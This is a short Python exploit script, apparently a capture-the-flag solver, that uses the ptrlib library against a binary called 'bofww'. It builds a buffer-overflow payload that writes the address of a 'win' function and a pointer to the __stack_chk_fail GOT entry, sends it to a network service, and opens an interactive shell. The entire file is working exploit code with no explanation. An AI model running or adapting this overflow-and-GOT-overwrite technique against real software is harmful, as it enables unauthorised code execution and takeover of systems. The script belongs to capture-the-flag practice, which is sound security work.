from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9002))

elf = ELF("../distfiles/bofww")
#sock = Process("../distfiles/bofww")
sock = Socket(HOST, PORT)

payload  = p64(elf.symbol("_Z3winv"))
payload += b"\x00"*0x128
payload += p64(elf.got("__stack_chk_fail"))
payload += p64(0x1000)
payload += p64(0x1000)
sock.sendlineafter("? ", payload)
sock.sendlineafter("? ", 0xdead)

sock.sh()
